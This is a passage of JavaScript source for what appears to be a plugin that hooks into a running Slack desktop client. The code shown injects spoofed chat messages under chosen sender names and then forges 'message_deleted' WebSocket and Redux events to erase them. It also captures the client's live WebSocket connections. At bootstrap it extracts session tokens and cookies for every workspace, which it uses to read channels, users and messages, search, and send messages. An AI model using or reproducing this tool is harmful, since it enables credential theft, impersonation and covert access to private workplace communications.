        '            if (tsEl.dateTime) tsEl.dateTime = now.toISOString();' +
        '          }' +
        '          clone.removeAttribute("id");' +
        '          msgList.appendChild(clone);' +
        '          clone.scrollIntoView({ behavior: "smooth" });' +
        '          result.strategy = "dom_clone";' +
        '          result.success = true;' +
        '        } else {' +
        // No existing messages — inject raw HTML
        '          var div = document.createElement("div");' +
        '          div.style.cssText = "padding:8px 16px;";' +
        '          div.innerHTML = "<strong>" + senderName.replace(/</g,"&lt;") + "</strong> <span style=\\"color:#999;font-size:0.8em\\">" + new Date().toLocaleTimeString() + "</span><div>" + text.replace(/</g,"&lt;") + "</div>";' +
        '          msgList.appendChild(div);' +
        '          result.strategy = "dom_raw";' +
        '          result.success = true;' +
        '        }' +
        '      } else {' +
        '        result.error = "No message list container found";' +
        '      }' +
        '    } catch(e) { result.error = "dom: " + String(e); }' +
        '  }' +
        '' +
        '  return JSON.stringify(result);' +
        '})()';

    return plugin.executeInRenderer(windowId, code).then(function(raw) {
        try {
            var data = JSON.parse(raw);
            // Track successful injections for later cleanup
            if (data.success && data.ts) {
                injectedMessages.push({
                    channelId: channelId,
                    ts: data.ts,
                    senderId: senderId,
                    senderName: senderName,
                    text: (text || '').substring(0, 100),
                    time: new Date().toISOString()
                });
                // Send updated list to UI
                plugin.sendData('injected_messages', { messages: injectedMessages, count: injectedMessages.length });
            }
            plugin.sendData('inject_result', data);
        } catch (e) {
            plugin.sendData('inject_result', { channelId: channelId, strategy: 'none', success: false, error: 'Parse error: ' + String(e) });
        }
    }).catch(function(e) {
        plugin.sendData('inject_result', { channelId: channelId, strategy: 'none', success: false, error: String(e) });
    });
    }); // findWorkspaceWindow
}

// ===== Injected message cleanup =====
// Simulates message_deleted RTM events via WebSocket to remove spoofed messages.
// Slack's client handles the deletion naturally — clears Redux state AND IndexedDB cache.

function clearInjectedMessages() {
    if (injectedMessages.length === 0) {
        plugin.sendData('clear_injected_result', { success: true, cleared: 0, message: 'No injected messages to clear' });
        return Promise.resolve();
    }

    var windows = plugin.getWindows();
    if (windows.length === 0) {
        plugin.sendData('clear_injected_result', { success: false, error: 'No windows available' });
        return Promise.resolve();
    }

    return findWorkspaceWindow().then(function(targetWindowId) {
    var windowId = targetWindowId || windows[0].id;
    // Ensure WS interceptor is installed on the target window
    plugin.executeInRenderer(windowId, wsInterceptorCode);
    // Build deletion events for each tracked message
    var msgs = injectedMessages.slice(); // copy
    var deletionPayloads = [];
    for (var i = 0; i < msgs.length; i++) {
        deletionPayloads.push({
            channelId: msgs[i].channelId,
            deletedTs: msgs[i].ts
        });
    }

    var safePayloads = JSON.stringify(deletionPayloads);

    var code =
        '(function() {' +
        '  var payloads = ' + safePayloads + ';' +
        '  var result = { cleared: 0, wsMethod: null, errors: [] };' +
        '' +
        // Get team ID for the events
        '  var teamId = null;' +
        '  try {' +
        '    var bd = window.boot_data || (window.TS && TS.boot_data);' +
        '    if (bd && bd.team_id) teamId = bd.team_id;' +
        '  } catch(e) {}' +
        '  if (!teamId) {' +
        '    try {' +
        '      var html = document.documentElement.innerHTML;' +
        '      var tm = html.match(/"team_id"\\s*:\\s*"([^"]+)"/);' +
        '      if (tm) teamId = tm[1];' +
        '    } catch(e) {}' +
        '  }' +
        '' +
        // Strategy 1: WebSocket message_deleted events (best — triggers full client cleanup)
        '  var wsUsed = false;' +
        '  var openWs = null;' +
        // Try captured WS first
        '  if (window.__JSTAP_WS_CAPTURED && window.__JSTAP_WS_CAPTURED.length > 0) {' +
        '    for (var wi = 0; wi < window.__JSTAP_WS_CAPTURED.length; wi++) {' +
        '      if (window.__JSTAP_WS_CAPTURED[wi].readyState === 1) { openWs = window.__JSTAP_WS_CAPTURED[wi]; break; }' +
        '    }' +
        '  }' +
        // Fallback: scan window properties for live WebSocket instances
        '  if (!openWs) {' +
        '    try {' +
        '      var keys = Object.keys(window);' +
        '      for (var ki = 0; ki < keys.length && !openWs; ki++) {' +
        '        try {' +
        '          var val = window[keys[ki]];' +
        '          if (val instanceof WebSocket && val.readyState === 1) { openWs = val; }' +
        '        } catch(e) {}' +
        '      }' +
        '    } catch(e) {}' +
        '  }' +
        '  if (openWs) {' +
        '    for (var p = 0; p < payloads.length; p++) {' +
        '      try {' +
        '        var delEvent = {' +
        '          type: "message",' +
        '          subtype: "message_deleted",' +
        '          channel: payloads[p].channelId,' +
        '          deleted_ts: payloads[p].deletedTs,' +
        '          hidden: true,' +
        '          ts: String(Date.now() / 1000)' +
        '        };' +
        '        if (teamId) { delEvent.team = teamId; }' +
        '        var eventData = JSON.stringify(delEvent);' +
        '        var msgEvent = new MessageEvent("message", { data: eventData });' +
        '        if (typeof openWs.onmessage === "function") {' +
        '          openWs.onmessage(msgEvent);' +
        '          result.cleared++;' +
        '          wsUsed = true;' +
        '        } else {' +
        '          try { openWs.dispatchEvent(msgEvent); result.cleared++; wsUsed = true; } catch(e) {}' +
        '        }' +
        '      } catch(e) { result.errors.push("ws_delete: " + String(e)); }' +
        '    }' +
        '    if (wsUsed) result.wsMethod = "websocket_message_deleted";' +
        '  }' +
        '' +
        // Strategy 2: Redux dispatch fallback
        '  if (!wsUsed) {' +
        '    var store = null;' +
        '    var globals = ["__REDUX_STORE__", "store", "__store", "reduxStore"];' +
        '    for (var g = 0; g < globals.length; g++) {' +
        '      try { if (window[globals[g]] && typeof window[globals[g]].dispatch === "function") { store = window[globals[g]]; break; } } catch(e) {}' +
        '    }' +
        '    if (!store) {' +
        '      try {' +
        '        var keys = Object.keys(window);' +
        '        for (var k = 0; k < keys.length; k++) {' +
        '          try {' +
        '            var v = window[keys[k]];' +
        '            if (v && typeof v === "object" && typeof v.getState === "function" && typeof v.dispatch === "function") { store = v; break; }' +
        '          } catch(e) {}' +
        '        }' +
        '      } catch(e) {}' +
        '    }' +
        '    if (store) {' +
        '      for (var p2 = 0; p2 < payloads.length; p2++) {' +
        '        try {' +
        '          var delMsg = { type: "message", subtype: "message_deleted", channel: payloads[p2].channelId, deleted_ts: payloads[p2].deletedTs, hidden: true, ts: String(Date.now() / 1000) };' +
        '          if (teamId) delMsg.team = teamId;' +
        '          var actionTypes = ["@@realtime/EVENT_RECEIVED", "realtime/event_received", "messages/delete", "MESSAGE_DELETED"];' +
        '          for (var a = 0; a < actionTypes.length; a++) {' +
        '            try { store.dispatch({ type: actionTypes[a], data: delMsg, message: delMsg, payload: delMsg }); } catch(e) {}' +
        '          }' +
        '          result.cleared++;' +
        '        } catch(e) { result.errors.push("redux_delete: " + String(e)); }' +
        '      }' +
        '      result.wsMethod = "redux_dispatch";' +
        '    }' +
        '  }' +
        '' +
        '  return JSON.stringify(result);' +
        '})()';

    return plugin.executeInRenderer(windowId, code).then(function(raw) {
        try {
            var data = JSON.parse(raw);
            if (data.cleared > 0) {
                // Clear the tracking list
                injectedMessages = [];
                plugin.sendData('injected_messages', { messages: [], count: 0 });
            }
            plugin.sendData('clear_injected_result', {
                success: data.cleared > 0,
                cleared: data.cleared,
                method: data.wsMethod,
                errors: data.errors || []
            });
        } catch (e) {
            plugin.sendData('clear_injected_result', { success: false, error: 'Parse error: ' + String(e) });
        }
    }).catch(function(e) {
        plugin.sendData('clear_injected_result', { success: false, error: String(e) });
    });
    }); // findWorkspaceWindow
}

// ===== Command handler =====

function onCommand(cmd) {
    var action = cmd.action;

    // Renderer-level commands — no API credentials needed
    if (action === 'probe_store') return probeStore();
    if (action === 'inject_message') return injectMessage(cmd.channelId, cmd.senderId, cmd.text, cmd.senderName);
    if (action === 'clear_injected') return clearInjectedMessages();

    // Workspace switching — works even before credReady for edge cases
    if (action === 'switch_workspace') {
        var idx = parseInt(cmd.workspaceIndex, 10);
        if (isNaN(idx) || idx < 0 || idx >= allWorkspaces.length) {
            plugin.sendData('_error', { phase: 'switch_workspace', error: 'Invalid workspace index: ' + cmd.workspaceIndex });
            return;
        }
        activeWorkspaceIndex = idx;
        creds = allWorkspaces[idx];
        userMap = {};

        // Send updated workspace list with new activeIndex
        var wsList = [];
        for (var wi = 0; wi < allWorkspaces.length; wi++) {
            wsList.push({
                teamName: allWorkspaces[wi].teamName || '?',
                domain: allWorkspaces[wi].domain || '',
                teamId: allWorkspaces[wi].teamId || '',
                userName: allWorkspaces[wi].userName || ''
            });
        }
        plugin.sendData('workspace_list', { workspaces: wsList, activeIndex: idx });

        return fetchIdentity().then(function(ok) {
            if (!ok) return;
            return findWorkspaceWindow().then(function(winId) {
                // Try local extraction first, fall back to API
                return fetchUsersLocal(winId).then(function(localUsers) {
                    if (!localUsers) return fetchUsers();
                }).then(function() {
                    return fetchChannelsLocal(winId).then(function(localChannels) {
                        if (!localChannels) return fetchChannels();
                    });
                });
            }).then(function() {
                plugin.sendData('switch_complete', { workspaceIndex: idx, teamId: creds.teamId, teamName: creds.teamName });
            });
        });
    }

    if (!credReady || !creds) {
        plugin.sendData('_error', { phase: 'command', error: 'Credentials not ready yet' });
        return;
    }

    if (action === 'fetch_channels') {
        return findWorkspaceWindow().then(function(winId) {
            return fetchChannelsLocal(winId).then(function(ok) {
                if (!ok) return fetchChannels();
            });
        });
    } else if (action === 'fetch_users') {
        return findWorkspaceWindow().then(function(winId) {
            return fetchUsersLocal(winId).then(function(ok) {
                if (!ok) return fetchUsers();
            });
        });
    } else if (action === 'fetch_messages') {
        return findWorkspaceWindow().then(function(winId) {
            return fetchMessagesLocal(winId, cmd.channelId, cmd.channelName).then(function(ok) {
                if (!ok) return fetchMessages(cmd.channelId, cmd.channelName, cmd.limit);
            });
        });
    } else if (action === 'send_message') {
        return sendMessage(cmd.channelId, cmd.text, cmd.channelName);
    } else if (action === 'search_messages') {
        return searchMessages(cmd.query, cmd.count, cmd.page);
    } else if (action === 'refresh_credentials') {
        return extractCredentials().then(function(newCreds) {
            if (newCreds) {
                creds = newCreds;
                return fetchIdentity();
            }
        });
    }
}

// ===== Bootstrap =====

var retryInterval = (plugin.settings.retryInterval || 15) * 1000;

function tryBootstrap() {
    bootstrapAttempts++;
    installWsInterceptor();

    extractAllCredentials().then(function(workspaces) {
        if (!workspaces || workspaces.length === 0) {
            // Fall back to single-credential extraction for compatibility
            return extractCredentials().then(function(extracted) {
                if (!extracted) {
                    var delay;
                    if (bootstrapAttempts <= 3) delay = 3000;
                    else if (bootstrapAttempts <= 6) delay = 8000;
                    else delay = retryInterval;
                    plugin.setTimeout(tryBootstrap, delay);
                    return;
                }
                allWorkspaces = [extracted];
                activeWorkspaceIndex = 0;
                creds = allWorkspaces[0];
                credReady = true;

                plugin.sendData('workspace_list', {
                    workspaces: [{ teamName: creds.teamName || '?', domain: creds.domain || '', teamId: creds.teamId || '' }],
                    activeIndex: 0
                });

                fetchIdentity().then(function(ok) {
                    if (!ok) {
                        credReady = false;
                        plugin.setTimeout(tryBootstrap, retryInterval);
                        return;
                    }
                    findWorkspaceWindow().then(function(winId) {
                        fetchUsersLocal(winId).then(function(localUsers) {
                            if (!localUsers) return fetchUsers();
                        }).then(function() {
                            if (plugin.settings.autoFetchChannels !== 0) {
                                fetchChannelsLocal(winId).then(function(localChannels) {
                                    if (!localChannels) fetchChannels();
                                });
                            }
                        });
                    });
                });
            });
        }

        // extractAllCredentials already verified each token+cookie pair via auth.test
        // and populated teamName/userName/domain — workspaces are ready to use
        allWorkspaces = workspaces;
        activeWorkspaceIndex = 0;
        creds = allWorkspaces[0];
        credReady = true;

        // Send workspace list to UI
        var wsList = [];
        for (var w = 0; w < allWorkspaces.length; w++) {
            wsList.push({
                teamName: allWorkspaces[w].teamName || '?',
                domain: allWorkspaces[w].domain || '',
                teamId: allWorkspaces[w].teamId || '',
                userName: allWorkspaces[w].userName || ''
            });
        }
        plugin.sendData('workspace_list', { workspaces: wsList, activeIndex: 0 });

        // Bootstrap the active workspace
        fetchIdentity().then(function(ok) {
            if (!ok) {
                credReady = false;
                plugin.setTimeout(tryBootstrap, retryInterval);
                return;
            }
            findWorkspaceWindow().then(function(winId) {
                fetchUsersLocal(winId).then(function(localUsers) {
                    if (!localUsers) return fetchUsers();
                }).then(function() {
                    if (plugin.settings.autoFetchChannels !== 0) {
                        fetchChannelsLocal(winId).then(function(localChannels) {
                            if (!localChannels) fetchChannels();
                        });
                    }
                });
            });
        });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'bootstrap', error: String(e), stack: e.stack || '' });
        plugin.setTimeout(tryBootstrap, retryInterval);
    });
}

plugin.setTimeout(tryBootstrap, 3000);

return {
    cleanup: function() {},
    onCommand: onCommand
};
